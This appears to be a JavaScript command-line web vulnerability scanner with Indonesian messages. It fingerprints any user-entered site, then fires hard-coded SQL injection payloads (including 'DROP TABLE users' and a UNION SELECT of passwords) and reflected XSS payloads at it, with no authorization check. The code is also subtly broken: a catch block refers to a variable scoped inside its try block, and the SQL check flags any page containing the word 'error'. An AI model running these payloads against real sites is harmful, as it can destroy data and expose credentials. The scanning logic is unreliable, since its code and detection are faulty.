import chalk from 'chalk';
import axios from 'axios';
import ora from 'ora';
import Table from 'cli-table3';
import * as cheerio from 'cheerio';
import inquirer from 'inquirer';
import { validateUrl } from './utils.js';
import { generateReport } from './reporter.js';

const sqlPayloads = [
  "' OR '1'='1",
  "' OR 1=1--",
  "'; DROP TABLE users--",
  "' UNION SELECT NULL, username, password FROM users--"
];

const xssPayloads = [
  "<script>alert('XSS')</script>",
  "javascript:alert('XSS')",
  "<img src=x onerror=alert('XSS')>"
];

const wafSignatures = [
  'mod_security',
  'AWS WAF',
  'Cloudflare',
  'Sucuri',
  'Wordfence',
  'Imperva',
  'F5 BIG-IP'
];

export async function runScanner() {
  const { target } = await inquirer.prompt([{
    type: 'input',
    name: 'target',
    message: chalk.green('[🌐] Masukkan target URL:'),
    validate: (input) => validateUrl(input) || 'URL tidak valid!'
  }]);

  const spinner = ora(chalk.cyan('[🔍] Mengumpulkan informasi target...')).start();
  
  try {
    // Get target info
    const response = await axios.get(target, {
      timeout: 10000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
      }
    });

    const $ = cheerio.load(response.data);
    const server = response.headers['server'] || 'Tidak terdeteksi';
    const poweredBy = response.headers['x-powered-by'] || 'Tidak terdeteksi';
    const techStack = detectTechStack($);
    
    spinner.succeed(chalk.green('[✅] Informasi target berhasil dikumpulkan!'));
    
    // Display target info
    const infoTable = new Table({
      head: [chalk.cyan('Parameter'), chalk.cyan('Value')],
      colWidths: [20, 50]
    });
    
    infoTable.push(
      ['Target URL', target],
      ['Status Code', response.status],
      ['Server', server],
      ['Powered By', poweredBy],
      ['Tech Stack', techStack.join(', ')],
      ['Content Length', response.headers['content-length'] || 'N/A']
    );
    
    console.log(chalk.magenta('\n[📊] Informasi Target:'));
    console.log(infoTable.toString());
    
    // Start scanning
    console.log(chalk.yellow('\n[🚨] MEMULAI PROSES SCANNING...'));
    
    const scanResults = {
      target,
      timestamp: new Date().toISOString(),
      vulnerabilities: []
    };
    
    // SQL Injection Scan
    spinner.start(chalk.cyan('[💉] Mengecek SQL Injection...'));
    const sqlResults = await checkSqlInjection(target);
    spinner.succeed(chalk.green('[✅] SQL Injection scan selesai!'));
    
    if (sqlResults.length > 0) {
      scanResults.vulnerabilities.push(...sqlResults);
      console.log(chalk.red(`[⚠️] Ditemukan ${sqlResults.length} kerentanan SQL Injection!`));
    } else {
      console.log(chalk.green('[✅] Tidak ada kerentanan SQL Injection ditemukan'));
    }
    
    // XSS Scan
    spinner.start(chalk.cyan('[🔥] Mengecek XSS...'));
    const xssResults = await checkXSS(target);
    spinner.succeed(chalk.green('[✅] XSS scan selesai!'));
    
    if (xssResults.length > 0) {
      scanResults.vulnerabilities.push(...xssResults);
      console.log(chalk.red(`[⚠️] Ditemukan ${xssResults.length} kerentanan XSS!`));
    } else {
      console.log(chalk.green('[✅] Tidak ada kerentanan XSS ditemukan'));
    }
    
    // WAF Detection
    spinner.start(chalk.cyan('[🛡️] Mendeteksi WAF...'));
    const wafResults = detectWAF(response);
    spinner.succeed(chalk.green('[✅] WAF detection selesai!'));
    
    if (wafResults.length > 0) {
      scanResults.waf = wafResults;
      console.log(chalk.magenta(`[🛡️] WAF terdeteksi: ${wafResults.join(', ')}`));
    } else {
      console.log(chalk.yellow('[⚠️] Tidak ada WAF terdeteksi!'));
    }
    
    // Bug Bounty Check
    spinner.start(chalk.cyan('[💰] Mengecek program Bug Bounty...'));
    const bugBounty = await checkBugBounty(target);
    spinner.succeed(chalk.green('[✅] Bug Bounty check selesai!'));
    
    if (bugBounty) {
      scanResults.bugBounty = bugBounty;
      console.log(chalk.green(`[💰] Program Bug Bounty tersedia: ${bugBounty}`));
    } else {
      console.log(chalk.yellow('[⚠️] Tidak ada program Bug Bounty ditemukan'));
    }
    
    // Generate report
    await generateReport(scanResults);
    
    console.log(chalk.green('\n[📄] Laporan scanning berhasil dibuat!'));
    
  } catch (error) {
    spinner.fail(chalk.red('[❌] Gagal mengakses target!'));
    console.error(chalk.red('[ERROR]'), error.message);
  }
}

async function checkSqlInjection(url) {
  const results = [];
  
  for (const payload of sqlPayloads) {
    try {
      const testUrl = `${url}?id=${encodeURIComponent(payload)}`;
      const response = await axios.get(testUrl, { timeout: 5000 });
      
      if (response.data.match(/sql|mysql|syntax|error/i)) {
        results.push({
          type: 'SQL Injection',
          payload,
          url: testUrl,
          evidence: 'SQL error detected in response'
        });
      }
    } catch (error) {
      if (error.response && [500, 501, 502].includes(error.response.status)) {
        results.push({
          type: 'SQL Injection',
          payload,
          url: testUrl,
          evidence: `Server error: ${error.response.status}`
        });
      }
    }
  }
  
  return results;
}

async function checkXSS(url) {
  const results = [];
  
  for (const payload of xssPayloads) {
    try {
      const testUrl = `${url}?q=${encodeURIComponent(payload)}`;
      const response = await axios.get(testUrl, { timeout: 5000 });
      
      if (response.data.includes(payload)) {
        results.push({
          type: 'XSS',
          payload,
          url: testUrl,
          evidence: 'Payload reflected in response'
        });
      }
    } catch (error) {
      // Continue on error
    }
  }
  
  return results;
}

function detectWAF(response) {
  const detected = [];
  const headers = response.headers;
  
  for (const signature of wafSignatures) {
    if (headers.server?.toLowerCase().includes(signature.toLowerCase()) ||
        headers['x-powered-by']?.toLowerCase().includes(signature.toLowerCase()) ||
        headers['x-waf']?.toLowerCase().includes(signature.toLowerCase())) {
      detected.push(signature);
    }
  }
  
  return detected;
}

function detectTechStack($) {
  const tech = [];
  
  if ($('meta[name="generator"]').length) {
    tech.push($('meta[name="generator"]').attr('content'));
  }
  
  if ($('script[src*="jquery"]').length) tech.push('jQuery');
  if ($('script[src*="react"]').length) tech.push('React');
  if ($('script[src*="angular"]').length) tech.push('Angular');
  if ($('script[src*="vue"]').length) tech.push('Vue.js');
  
  return tech;
}

async function checkBugBounty(url) {
  try {
    const domain = new URL(url).hostname;
    const platforms = [
      `https://hackerone.com/${domain}`,
      `https://bugcrowd.com/${domain}`,
      `https://www.intigriti.com/programs/${domain}`
    ];
    
    for (const platform of platforms) {
      try {
        const response = await axios.head(platform, { timeout: 5000 });
        if (response.status === 200) {
          return platform;
        }
      } catch (error) {
        // Continue to next platform
      }
    }
  } catch (error) {
    // Invalid URL
  }
  
  return null;
}
